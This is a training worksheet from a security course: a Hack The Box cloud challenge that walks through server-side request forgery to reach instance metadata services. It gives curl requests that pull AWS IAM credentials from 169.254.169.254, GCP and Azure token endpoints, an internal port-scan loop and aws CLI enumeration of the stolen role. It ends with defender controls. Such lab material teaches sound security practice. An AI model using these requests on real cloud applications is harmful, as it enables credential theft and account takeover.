---
title: "HTB Cloud Series Day 2 — SSRF to Cloud Metadata"
tags: [HTB, HackTheBox, CTF, cloud, SSRF, metadata, AWS, GCP, Azure, practice, bug-bounty]
module: 05-BugBountyOps-02
day: 307
related_topics:
  - HTB Cloud Series Day 1 (Day 306)
  - SSRF (Day 134)
  - Cloud Exploitation (R-09)
---

# Day 307 — HTB Cloud Series Day 2: SSRF to Cloud Metadata

> "SSRF in a cloud environment is not a medium. It is a critical. One request
> to 169.254.169.254 and the attacker has the IAM role. The developers who
> built that internal request feature never intended to build a key handout
> service. But they did."
>
> — Ghost

---

## Goals

Exploit Server-Side Request Forgery on a cloud-hosted application to reach the
instance metadata service (IMDS) and extract IAM credentials.

**Time budget:** 4–5 hours.

---

## Pre-Engagement Plan

```
Target: HTB Cloud challenge — SSRF to metadata focus
Hypothesis: Web application makes outbound requests controlled by user input.
            Redirect to 169.254.169.254 (AWS) or equivalent metadata endpoint.

Attack phases:
  1. Find SSRF vector in the application
  2. Confirm blind vs. reflected SSRF
  3. Redirect to metadata endpoint
  4. Extract IAM role credentials
  5. Use credentials for lateral movement / flag
```

---

## Engagement Log

### Phase 1 — SSRF Vector Discovery

Common entry points to test:

```
[ ] URL parameters:    ?url=   ?src=   ?path=   ?file=   ?fetch=
[ ] Webhook registration endpoints
[ ] Import/export functionality (import from URL)
[ ] PDF / screenshot generators
[ ] Image proxy endpoints
[ ] XML input with external entity (XXE → SSRF)
[ ] Redirect parameters:  ?redirect=   ?next=   ?return=
[ ] Referrer header in internal requests
```

```
Vector found: ___
Parameter / field: ___
Request:
  ___
```

### Phase 2 — Confirming SSRF

```bash
# Test 1: Blind SSRF — OOB callback
curl 'https://TARGET/fetch?url=http://BURPCOLLABORATOR.net'
# Result: ___

# Test 2: Loopback
curl 'https://TARGET/fetch?url=http://127.0.0.1/'
# Result: ___

# Test 3: Internal port scan via SSRF
for port in 80 443 8080 8443 3000 9200 6379; do
  curl -s "https://TARGET/fetch?url=http://127.0.0.1:$port" | head -c 200
done
# Results: ___
```

### Phase 3 — Metadata Endpoint

```bash
# AWS IMDSv1 (unauthenticated — no token required)
curl 'https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/'
# Expected: ami-id, hostname, iam/, network/, ...

# Enumerate IAM role name
curl 'https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# Returns: ROLE_NAME

# Extract credentials for that role
curl 'https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration
```

```
IMDSv1 accessible: Y/N
Role name: ___
Credentials extracted:
  AccessKeyId:     ___
  SecretAccessKey: ___
  Token:           ___
  Expiration:      ___
```

### Phase 4 — IMDSv2 Bypass (if v1 is blocked)

```
IMDSv2 requires a PUT request to get a token first.
Many SSRF vectors cannot send arbitrary HTTP methods — but some can.

# Step 1: Get token (requires PUT with TTL header)
curl -X PUT 'http://169.254.169.254/latest/api/token' \
  -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'

# Step 2: Use token in subsequent requests
curl 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' \
  -H 'X-aws-ec2-metadata-token: TOKEN'

# SSRF bypass technique — if the app allows custom headers:
# Set X-aws-ec2-metadata-token-ttl-seconds in the SSRF request header field
# Result: ___
```

### Phase 5 — GCP and Azure Metadata (alternative environments)

```bash
# GCP metadata endpoint
http://metadata.google.internal/computeMetadata/v1/
# Requires: Metadata-Flavor: Google header (possible via header injection SSRF)

# GCP service account token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires: Metadata: true header

# Azure managed identity token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

```
Cloud provider: AWS / GCP / Azure
Metadata endpoint accessible: ___
Credentials / token obtained: ___
```

### Phase 6 — Post-Credential Exploitation

```bash
# Configure AWS with extracted credentials (including session token)
export AWS_ACCESS_KEY_ID=EXTRACTED_AKID
export AWS_SECRET_ACCESS_KEY=EXTRACTED_SECRET
export AWS_SESSION_TOKEN=EXTRACTED_TOKEN

# Identify the role
aws sts get-caller-identity

# Enumerate permissions
python3 enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --session-token $AWS_SESSION_TOKEN

# Look for flag
aws s3 ls
aws ssm describe-parameters
aws secretsmanager list-secrets
```

### Flag

```
FLAG{___}
SSRF vector: ___
Cloud provider: ___
Total time: ___ min
```

---

## Debrief

```
Why IMDSv1 is dangerous:
  - No authentication required — any HTTP GET to 169.254.169.254 works
  - EC2 instance roles are often over-permissioned
  - SSRF to metadata is classified as Critical in AWS threat model

Why IMDSv2 helps but doesn't fully fix SSRF:
  - Only prevents IMDSv1 metadata theft
  - Attacker can still reach internal services via SSRF
  - Header injection SSRFs can still obtain IMDSv2 tokens

Real-world cases:
  - Capital One (2019): CVE assigned, ~$80M fine
  - Multiple reported HTB/TryHackMe cloud challenges mirror this path
  - Scores of HackerOne reports on AWS-hosted targets

Defender controls:
  1. Enforce IMDSv2 (HttpTokens: required) on all EC2 instances
  2. IAM role permissions — EC2 role should have minimal permissions
  3. WAF / application-level: block outbound requests to 169.254.x.x
  4. VPC endpoint policies — restrict what the role can access even if stolen
```

---

## Questions

> Add your questions here. Each question gets a Global ID (Q307.1, Q307.2 …).

---

## Navigation

← Previous: [Day 306 — HTB Cloud Series Day 1](DAY-0306-HTB-Cloud-Series-Day-01.md)
→ Next: [Day 308 — HTB Cloud Series Day 3](DAY-0308-HTB-Cloud-Series-Day-03.md)
